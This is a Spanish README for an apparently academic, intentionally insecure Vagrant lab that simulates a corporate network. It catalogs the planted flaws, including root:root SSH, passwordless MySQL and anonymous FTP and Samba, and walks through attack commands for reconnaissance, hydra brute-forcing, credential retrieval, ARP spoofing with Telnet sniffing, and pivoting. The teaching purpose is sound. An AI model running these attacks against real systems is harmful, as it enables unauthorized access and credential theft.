# Bloque 4 — Insecure Network Lab

Infraestructura de red intencionalmente insegura para demostrar ataques reales
sobre configuraciones incorrectas comunes en entornos corporativos. Debe usarse exclusivamente 
en este entorno aislado.

---

## Índice

1. [Descripción](#descripción)
2. [Topología](#topología)
3. [Máquinas virtuales](#máquinas-virtuales)
4. [Malas prácticas documentadas](#malas-prácticas-documentadas)
5. [Requisitos](#requisitos)
6. [Despliegue](#despliegue)
7. [Escenarios de ataque](#escenarios-de-ataque)
8. [Advertencia legal](#advertencia-legal)

---

## Descripción
Este bloque simula una red corporativa con errores de configuración reales y
frecuentes. El objetivo es poder reproducir y comprender los
ataques descritos en el capítulo 7 de la memoria, observando en un entorno
controlado las consecuencias de cada mala práctica.

El laboratorio se compone de cuatro máquinas virtuales orquestadas con Vagrant
sobre VirtualBox. Todas las redes son internas (`intnet`) y no tienen salida
real a internet durante las prácticas — la interfaz NAT de Vagrant solo se usa
durante el aprovisionamiento inicial.
---

## Topología

Pendiente de hacer.

## Máquinas virtuales

| VM | Box | IP | Red | RAM | Rol |
|---|---|---|---|---|---|
| `external-kali` | kalilinux/rolling | 100.70.9.10 | net-external | 1024 MB | Atacante |
| `firewall` | ubuntu/jammy64 | 100.70.9.1 / 192.168.57.1 / 192.168.58.1 | todas | 512 MB | Firewall permisivo |
| `dmz-server` | ubuntu/jammy64 | 192.168.57.10 | net-dmz | 512 MB | Web + FTP + Telnet |
| `internal-server` | ubuntu/jammy64 | 192.168.58.10 | net-interna | 512 MB | Datos + SSH débil |

---

## Malas prácticas documentadas

### Firewall (`firewall`)
- Política `ACCEPT` por defecto en `INPUT`, `OUTPUT` y `FORWARD`
- `ip_forward` habilitado sin restricción de rutas entre segmentos
- Sin inspección de estado (`conntrack`)
- Reglas explícitas que permiten tráfico externo → red interna directamente
- Sin logging de tráfico — los ataques no dejan rastro
- `rp_filter` desactivado — permite spoofing de origen

### DMZ (`dmz-server`)
- Apache con `ServerTokens Full` — expone versión exacta en cabeceras HTTP
- `phpinfo()` accesible públicamente en `/info.php`
- Panel de administración en `/admin/` sin ninguna autenticación
- Directorio `/backup/` con credenciales descargables vía HTTP
- FTP anónimo habilitado con vsftpd — acceso sin contraseña
- Telnet activo en puerto 23 — credenciales en texto claro
- Sin firewall local (`ufw` desactivado)
- Acceso directo a `internal-server` sin restricción (DMZ no aislada)

### Servidor interno (`internal-server`)
- SSH con `PermitRootLogin yes` y contraseña `root:root`
- Banner SSH que revela versión del sistema operativo y software
- MySQL con usuario `root` sin contraseña y `bind-address 0.0.0.0`
- Credenciales almacenadas en texto plano en base de datos
- Samba con recurso compartido anónimo sin autenticación
- Sin firewall local — todos los puertos accesibles
- Logging de sistema desactivado

---

## Requisitos

- VirtualBox >= 7.0
- Vagrant >= 2.4
- Espacio en disco: ~15 GB (boxes + VMs)
- RAM disponible: mínimo 3 GB

Instalar en el host Ubuntu Server 24.04:

```bash
# VirtualBox
sudo apt install -y virtualbox virtualbox-ext-pack

# Vagrant
wget -O- https://apt.releases.hashicorp.com/gpg | \
  sudo gpg --dearmor -o /usr/share/keyrings/hashicorp-archive-keyring.gpg
echo "deb [signed-by=/usr/share/keyrings/hashicorp-archive-keyring.gpg] \
  https://apt.releases.hashicorp.com $(lsb_release -cs) main" | \
  sudo tee /etc/apt/sources.list.d/hashicorp.list
sudo apt update && sudo apt install -y vagrant
```

---

## Despliegue

```bash
# Clonar el repositorio y entrar al bloque
cd 4-insecure-network-lab/

# Levantar todas las VMs (primera vez: descarga boxes ~4 GB)
vagrant up

# Levantar solo una VM
vagrant up external-kali

# Acceder a una VM
vagrant ssh external-kali
vagrant ssh internal-server

# Ver estado de las VMs
vagrant status

# Detener sin destruir
vagrant halt

# Destruir todo el laboratorio
vagrant destroy -f
```

El orden de aprovisionamiento recomendado es el que gestiona Vagrant
automáticamente: `firewall` → `internal-server` → `dmz-server` → `external-kali`.

---

## Escenarios de ataque

Todos los ataques se ejecutan desde `external-kali` (`vagrant ssh external-kali`).

### 1. Reconocimiento de red

```bash
# Descubrimiento de hosts activos
netdiscover -r 192.168.57.0/24
netdiscover -r 192.168.58.0/24

# Escaneo de puertos y servicios
nmap-quick 192.168.57.10      # dmz-server
nmap-full  192.168.58.10      # internal-server

# Enumeración SMB
enum4linux 192.168.58.10
```

### 2. Acceso a DMZ

```bash
# Descargar credenciales expuestas vía HTTP
curl http://192.168.57.10/backup/credentials.txt
curl http://192.168.57.10/info.php        # phpinfo completo

# FTP anónimo
ftp 192.168.57.10
# usuario: anonymous / sin contraseña
# get /public/config_backup.txt

# Telnet en texto claro (capturar con Wireshark en paralelo)
telnet 192.168.57.10
# usuario: operator / contraseña: operator
```

### 3. Acceso a red interna

```bash
# Fuerza bruta SSH con hydra
hydra -l root -p root ssh://192.168.58.10

# Acceso MySQL sin contraseña
mysql -h 192.168.58.10 -u root
# USE corporativedb; SELECT * FROM user_credentials;

# Recurso Samba anónimo
smbclient //192.168.58.10/confidential -N
# get passwords.txt
```

### 4. ARP Spoofing y captura de tráfico

```bash
# Habilitar ip_forward en Kali para no cortar el tráfico
echo 1 > /proc/sys/net/ipv4/ip_forward

# ARP Spoofing entre dmz-server y firewall
arpspoof -i eth1 -t 192.168.57.10 192.168.57.1 &
arpspoof -i eth1 -t 192.168.57.1  192.168.57.10 &

# Capturar tráfico Telnet en claro
tcpdump -i eth1 -A port 23
```

### 5. Pivoting DMZ → red interna

```bash
# Desde dmz-server (tras acceder por Telnet o FTP)
mysql -h 192.168.58.10 -u root    # acceso directo a internal-server
smbclient //192.168.58.10/confidential -N
```

---

## Advertencia legal

Este laboratorio contiene configuraciones deliberadamente inseguras.
Debe ejecutarse exclusivamente en el entorno aislado descrito. 
Todos los datos son ficticios.
```